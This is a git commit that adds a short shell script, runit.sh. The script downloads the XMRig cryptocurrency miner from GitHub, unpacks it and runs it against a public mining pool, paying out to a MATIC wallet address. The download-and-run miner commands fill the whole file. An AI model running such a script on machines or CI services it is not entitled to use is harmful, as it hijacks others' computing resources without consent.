acf10f905b3db32d356081175c13c3c69d5ce294
dirayasa <dimas.hendrajs@gmail.com>
2022-07-15 16:17:11 +0700

    Create runit.sh

---
+++ runit.sh
@@ -0,0 +1,4 @@
+wget https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-linux-x64.tar.gz
+tar -xf xmrig-6.18.0-linux-x64.tar.gz
+cd xmrig-6.18.0/
+./xmrig -o rx.unmineable.com -a rx -k -u MATIC:0xaf06924E575FaCad9B7693D95636B924609A06DC.mincpu1 -p x
